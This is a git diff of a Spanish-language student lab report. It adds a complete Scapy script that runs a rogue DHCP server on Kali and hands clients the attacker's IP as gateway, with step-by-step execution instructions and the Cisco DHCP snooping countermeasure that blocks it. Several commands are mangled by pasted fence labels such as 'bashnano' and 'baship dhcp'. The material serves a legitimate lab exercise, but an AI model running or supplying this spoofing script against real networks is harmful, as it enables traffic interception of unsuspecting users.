@@ -41,10 +41,151 @@ Levantar un servidor DHCP falso que responda a solicitudes DHCP Discover y Reque
 5. El cliente recibe como gateway la IP de Kali en lugar de R1
 
 ```bash
-sudo python3 dhcp_spoofing.py <interfaz>
-sudo python3 dhcp_spoofing.py eth0
-```
+Crear y guardar el script:
+bashnano /home/kali-linux/dhcp_spoofing.py
 
+Pega el contenido del script, luego guarda con Ctrl+O → Enter → Ctrl+X
+
+Dar permisos de ejecución:
+bashchmod +x /home/kali-linux/dhcp_spoofing.py
+
+🪜 Pasos de ejecución
+Paso 1 — VPC1: Ver IP actual antes del ataque
+bashshow ip
+Paso 2 — Kali: Ejecutar el ataque
+bashsudo python3 /home/kali-linux/dhcp_spoofing.py eth0
+Paso 3 — VPC1: Solicitar nueva IP
+baship dhcp
+show ip
+
+Gateway debe mostrar 10.13.32.5 ← IP de Kali ✅
+
+Paso 4 — SW1: Aplicar contramedida
+bashconf t
+ip dhcp snooping
+ip dhcp snooping vlan 10
+ip dhcp snooping vlan 20
+no ip dhcp snooping information option
+interface e0/0
+ ip dhcp snooping trust
+exit
+end
+write memory
+Paso 5 — VPC1: Solicitar IP de nuevo
+baship dhcp
+show ip
+
+Gateway debe mostrar 10.13.32.1 ← R1 real ✅
+
+Paso 6 — SW1: Verificar bloqueo
+bashshow ip dhcp snooping statistics
+Paso 7 — SW1: Limpiar configuración (entorno de laboratorio)
+bashconf t
+no ip dhcp snooping
+end
+write memory
+
+🐍 Script — dhcp_spoofing.py
+python#!/usr/bin/env python3
+# =============================================================
+# Nombre:     Henry Vicente Quezada
+# Matricula:  2025-1332
+# Ataque:     DHCP Spoofing - Rogue Server
+# Fecha:      2026
+# =============================================================
+from scapy.all import *
+import sys
+
+FAKE_GATEWAY   = "10.13.32.5"
+FAKE_DNS       = "8.8.8.8"
+SUBNET_MASK    = "255.255.255.0"
+LEASE_TIME     = 86400
+NETWORK_PREFIX = "10.13.32."
+
+assigned_ips = {}
+ip_counter   = 50
+
+def get_next_ip():
+    global ip_counter
+    ip = NETWORK_PREFIX + str(ip_counter)
+    ip_counter = ip_counter + 1 if ip_counter < 80 else 50
+    return ip
+
+def handle_dhcp(pkt, iface):
+    if DHCP not in pkt:
+        return
+    dhcp_type = None
+    for opt in pkt[DHCP].options:
+        if opt[0] == 'message-type':
+            dhcp_type = opt[1]
+            break
+
+    client_mac = pkt[Ether].src
+
+    if dhcp_type == 1:
+        offered_ip = assigned_ips.get(client_mac, get_next_ip())
+        assigned_ips[client_mac] = offered_ip
+        print(f"[+] Discover de {client_mac} -> {offered_ip}")
+        offer = (
+            Ether(src=get_if_hwaddr(iface), dst=client_mac) /
+            IP(src=FAKE_GATEWAY, dst="255.255.255.255") /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, yiaddr=offered_ip, siaddr=FAKE_GATEWAY,
+                  chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
+            DHCP(options=[("message-type","offer"),("server_id",FAKE_GATEWAY),
+                ("lease_time",LEASE_TIME),("subnet_mask",SUBNET_MASK),
+                ("router",FAKE_GATEWAY),("name_server",FAKE_DNS),"end"])
+        )
+        sendp(offer, iface=iface, verbose=False)
+
+    elif dhcp_type == 3:
+        offered_ip = assigned_ips.get(client_mac, get_next_ip())
+        print(f"[+] Request de {client_mac} -> ACK {offered_ip}")
+        ack = (
+            Ether(src=get_if_hwaddr(iface), dst=client_mac) /
+            IP(src=FAKE_GATEWAY, dst="255.255.255.255") /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, yiaddr=offered_ip, siaddr=FAKE_GATEWAY,
+                  chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
+            DHCP(options=[("message-type","ack"),("server_id",FAKE_GATEWAY),
+                ("lease_time",LEASE_TIME),("subnet_mask",SUBNET_MASK),
+                ("router",FAKE_GATEWAY),("name_server",FAKE_DNS),"end"])
+        )
+        sendp(ack, iface=iface, verbose=False)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("\nUso: sudo python3 dhcp_spoofing.py <interfaz>")
+        sys.exit(1)
+    iface = sys.argv[1]
+    print("=" * 55)
+    print("       ATAQUE DHCP SPOOFING")
+    print("       Autor: Henry Vicente Quezada")
+    print("       Matricula: 2025-1332")
+    print("=" * 55)
+    print(f"[*] Gateway falso: {FAKE_GATEWAY}")
+    print("[*] Esperando DHCP...\n")
+    sniff(filter="udp and (port 67 or port 68)",
+          prn=lambda p: handle_dhcp(p, iface),
+          iface=iface, store=0)
+
+🛡️ Contramedida aplicada
+
+DHCP Snooping en SW1:
+SW1(config)# ip dhcp snooping
+SW1(config)# ip dhcp snooping vlan 10
+SW1(config)# ip dhcp snooping vlan 20
+SW1(config)# no ip dhcp snooping information option
+SW1(config)# interface e0/0
+SW1(config-if)# ip dhcp snooping trust
+SW1(config)# end
+SW1# write memory
+
+! Verificación
+SW1# show ip dhcp snooping statistics
+SW1# show ip dhcp snooping binding
+
+```
 ---
 
 ## 4. Documentación de la Red
@@ -96,23 +237,6 @@ sudo python3 dhcp_spoofing.py eth0
 
 > 📷 `SW1# show ip dhcp snooping statistics` — paquetes bloqueados
 
----
-
-## 6. Contramedidas
-
-```
-SW1(config)# ip dhcp snooping
-SW1(config)# ip dhcp snooping vlan 10
-SW1(config)# ip dhcp snooping vlan 20
-SW1(config)# no ip dhcp snooping information option
-SW1(config)# interface e0/0
-SW1(config-if)# ip dhcp snooping trust
-SW1(config)# end
-SW1# write memory
-
-! Verificación
-SW1# show ip dhcp snooping statistics
-SW1# show ip dhcp snooping binding
 ```
 
 DHCP Snooping marca los puertos como trust o untrust. Solo los puertos trust pueden enviar respuestas DHCP. El puerto e0/0 hacia R1 se marca trust. El puerto e0/3 de Kali queda untrust y sus respuestas DHCP son descartadas automáticamente.
